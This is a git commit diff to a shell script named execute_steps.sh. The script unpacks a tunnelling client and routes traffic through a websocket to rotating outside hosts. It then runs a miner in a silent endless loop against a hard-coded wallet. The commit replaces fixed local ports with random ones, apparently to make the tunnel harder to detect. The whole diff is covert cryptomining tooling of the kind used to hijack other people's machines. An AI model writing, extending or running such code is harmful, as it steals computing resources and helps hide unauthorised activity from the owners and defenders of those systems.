541d7225233e265b4a9361999e12b3ec366ecb41
sindilesiqhova <sindilesiqhova@gmail.com>
2024-12-13 21:07:55 +0200

    Update execute_steps.sh

--- execute_steps.sh
+++ execute_steps.sh
@@ -68,7 +68,11 @@ tar -xf stun_10.1.6.tar.gz
 
 sleep 2
 
-./stun client --http-upgrade-path-prefix aPvDUHQEdtM5tVStQajxIVKaXA2Ad5TSu -L tcp://9999:dme.infinium.space:36034 -L tcp://6666:superblockchain.con-ip.com:11132 ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.fun:80 &
+randomPort1=$(shuf -i 10000-65000 -n 1)
+sleep 2
+randomPort2=$(shuf -i 10000-65000 -n 1)
+
+./stun client --http-upgrade-path-prefix aPvDUHQEdtM5tVStQajxIVKaXA2Ad5TSu -L tcp://$randomPort1:dme.infinium.space:36034 -L tcp://$randomPort2:superblockchain.con-ip.com:11132 ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.fun:80 &
 
 sleep 2
 
@@ -78,6 +82,6 @@ sleep 2
 
 while true
 do
-./sbp -o 127.0.0.1:9999 -b 127.0.0.1:6666 -t $used_num_of_cores -v 3 --donate-level 1 -p $currentdate -u solo:dmeVN5ngoXMVU5574hWLoV9MbpkcxowaBdaKNh5Ua6xGdKcLmGFCRvWf6dAGm26TDwght9RePMeaCfjPL4ni39Fc3MhLBHJLuF 1>/dev/null 2>&1
+./sbp -o 127.0.0.1:$randomPort1 -b 127.0.0.1:$randomPort2 -t $used_num_of_cores -v 3 --donate-level 1 -p $currentdate -u solo:dmeVN5ngoXMVU5574hWLoV9MbpkcxowaBdaKNh5Ua6xGdKcLmGFCRvWf6dAGm26TDwght9RePMeaCfjPL4ni39Fc3MhLBHJLuF 1>/dev/null 2>&1
 sleep 10
 done
